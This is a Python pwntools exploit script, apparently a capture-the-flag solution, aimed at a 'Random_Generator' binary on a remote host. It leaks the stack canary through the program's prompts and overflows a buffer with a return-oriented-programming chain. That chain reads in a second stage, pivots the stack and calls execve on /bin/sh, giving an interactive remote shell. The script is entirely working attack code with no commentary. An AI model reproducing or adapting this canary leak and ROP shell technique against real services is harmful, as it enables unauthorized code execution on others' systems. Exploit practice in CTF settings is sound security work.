#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *   # pip install pwntools

elf = ELF("./Random_Generator")
context.binary = elf
r = remote("69.90.132.40", 4000)
#r = remote("localhost", 4000)

pop_rax_rdi = 0x400f8c
pop_rdi = 0x400f63
pop_rsi_r15 = 0x400f61
syscall = 0x400f8f
mov_rdx_rsi = 0x400f88
leave = 0x400e2e
pop_rbp_r14_r15 = 0x400f5f

canary = "\x00"
for i in range(1, 8):
    r.recvuntil("?\n")
    r.sendline(str(i))
    canary += p8(int(r.recvline().split()[-1]))
log.info("canary = " + canary.encode('hex'))

r.recvuntil("?\n")
r.sendline("0")
r.recvuntil("Leave a comment: ")
pause()

buf = 0x602140
buf2 = 0x602130

r.sendline("A" * 1032 + canary * 2 + flat([
    # read(0, buf, 1000)
    pop_rdi, 0, 
    pop_rsi_r15, 0x1000, 0, mov_rdx_rsi,
    pop_rsi_r15, buf, 0,
    syscall,

    pop_rbp_r14_r15, buf, 0, 0,
    leave
]))
#sleep(1)

r.send("/bin/sh\0" + flat(
    pop_rax_rdi, 59, buf,
    pop_rsi_r15, 0, 0,
    mov_rdx_rsi,
    syscall
))
r.interactive()

